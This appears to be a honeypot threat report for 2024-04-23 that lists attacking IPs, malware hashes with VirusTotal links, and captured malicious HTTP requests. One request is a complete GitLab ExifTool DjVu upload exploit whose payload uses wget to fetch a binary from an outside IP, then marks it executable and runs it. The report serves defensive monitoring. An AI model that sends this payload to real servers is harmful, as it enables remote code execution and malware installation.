@@ -1,0 +1,41 @@
+Top 5 IPs for 2024-04-23 :
+
+170.106.100.84
+104.160.0.76
+45.121.147.206
+218.92.247.138
+143.198.81.79
+
+Malware Download:
+543583ec4b776c1009b857082359ee2c6277c7cd54daa05f09bbf8ee462a7016
+https://www.virustotal.com/gui/file/543583ec4b776c1009b857082359ee2c6277c7cd54daa05f09bbf8ee462a7016
+fe4950561d2a88a1643fcf94894c3f9e2ecffb3d1c3f5ae7763c3e819974e4de
+https://www.virustotal.com/gui/file/fe4950561d2a88a1643fcf94894c3f9e2ecffb3d1c3f5ae7763c3e819974e4de
+
+
+Malcious Commands seen:
+
+GET /users/sign_up/users/sign_in HTTP/1.1
+Host: HOST-IP
+ser-Agent: python-requests/2.22.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+POST /users/sign_up/uploads/user HTTP/1.1
+Host: HOST-IP
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5
+X-CSRF-Token: TZ1PnepRxdEUlENfBYrcBfj/p7QkPCzaAIvyRoclAvnfHf3pQ6Hed1hdXiwvSnhZMf7GVPvqCCI0yLon5uYrrg==
+Content-Length: 962
+
+
+------WebKitFormBoundaryIMv3mxRg59TkFSX5
+Content-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"
+Content-Type: image/jpeg
+
+AT&TFORM....DJVMDIRM..........F......... !..N........k.D.,q..I.n....\"?FORM...^DJVUINFO...\n......d...INCL....shared_anno.iff.BG44.....J..........7..*..BG44........BG44.....\nFORM....DJVIANTa...P(metadata\n.(Copyright \"\\\n\" . qx{wget http://94.156.66.69/downwiththesyndrome.x86; chmod 777 downwiththesyndrome.x86; ./downwiththesyndrome.x86; ls\n\n} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n
+------WebKitFormBoundaryIMv3mxRg59TkFSX5--
